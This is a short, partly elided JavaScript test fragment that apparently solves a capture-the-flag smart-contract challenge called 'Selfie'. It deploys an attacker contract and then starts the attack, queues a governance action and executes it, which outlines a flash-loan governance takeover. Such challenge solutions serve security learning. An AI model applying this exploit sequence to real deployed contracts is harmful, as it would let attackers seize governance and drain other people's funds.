...
describe('[Challenge] Selfie', function () {
    ...
    it('Exploit', async function () {
        ...
        const AttackerFactory = await ethers.getContractFactory("AttackerSelfie", attacker);

        this.attackerContract = await AttackerFactory.deploy(this.pool.address, this.token.address, this.governance.address)

        await expect(this.attackerContract.startAttack())
         .to.emit(this.attackerContract, "Hola")

        await expect(this.attackerContract.putActionOnQueue())
        ...
        await this.attackerContract.execute(1)
    });
